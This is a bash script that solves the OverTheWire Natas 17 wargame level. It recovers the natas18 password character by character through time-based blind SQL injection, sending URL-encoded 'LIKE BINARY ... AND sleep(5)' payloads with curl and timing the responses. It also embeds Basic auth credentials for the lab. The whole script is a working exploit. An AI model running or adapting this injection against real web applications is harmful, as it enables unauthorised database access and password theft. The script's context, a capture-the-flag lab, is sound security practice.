#! /bin/bash

rawurlencode() {
  local string="${1}"
  local strlen=${#string}
  local encoded=""
  local pos c o

  for (( pos=0 ; pos<strlen ; pos++ )); do
     c=${string:$pos:1}
     case "$c" in
        [-_.~a-zA-Z0-9] ) o="${c}" ;;
        * )               printf -v o '%%%02x' "'$c"
     esac
     encoded+="${o}"
  done
  echo "${encoded}"    # You can either set a return variable (FASTER)
  REPLY="${encoded}"   #+or echo the result (EASIER)... or both... :p
}

export PASSWORD

# we assume the password length is 32
for i in {0..31}
do

  # loop through all valid possible characters
  for CH in {{0..9},{a..z},{A..Z}}
  do
    PASSWORD[$i]=$CH

    #
    # our SQL injection is USERNAME='natas18" AND password LIKE BINARY "TESTSTRING%" AND sleep(5) # '
    #
    # SELECT * from users where username="natas18" AND password LIKE BINARY "TESTSTRING%"  AND sleep(5) # "
    #
    INJECTION_BEG="$( rawurlencode 'natas18" AND password LIKE BINARY "' )"
    TESTSTRING=$(printf "%s" "${PASSWORD[@]}")
    INJECTION_END="$( rawurlencode '%" AND sleep(5) # ' )"

    # the last echo'ed $TESTSTRING would represent the working usr/passwd combo
    echo "PASSWORD: $TESTSTRING"

    # use time as a side channel attack
    TIMEOUTPUT=$( (time -p curl --silent \
      "http://natas17.natas.labs.overthewire.org/?username=${INJECTION_BEG}${TESTSTRING}${INJECTION_END}&debug" \
      -H 'Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==' \
      >/dev/null) 2>&1) # the "2>&1" is necessary cuz time() outputs to STDERR

    # TIMEOUTPUT should be something like:
    #   real 0.00
    #   user 0.00
    #   sys 0.00
    # 1. grab just the real time (ignore system and user time)
    # 2. drop the "real" string
    TIME="$(echo $TIMEOUTPUT | \
      grep real | \
      cut -f 2 -d ' ')" 

   # use "binary calcuator" since bash doesn't do floating point natively
   ISGREATERTHANFIVESECONDS=$( echo $TIME '>' 5 | bc -l )
   if [ $ISGREATERTHANFIVESECONDS -eq 1 ]; then
      # if the string "This user exists." it means our user+pw combo worked
      # and we can move onto the next character
      break;
   fi
  done

done 
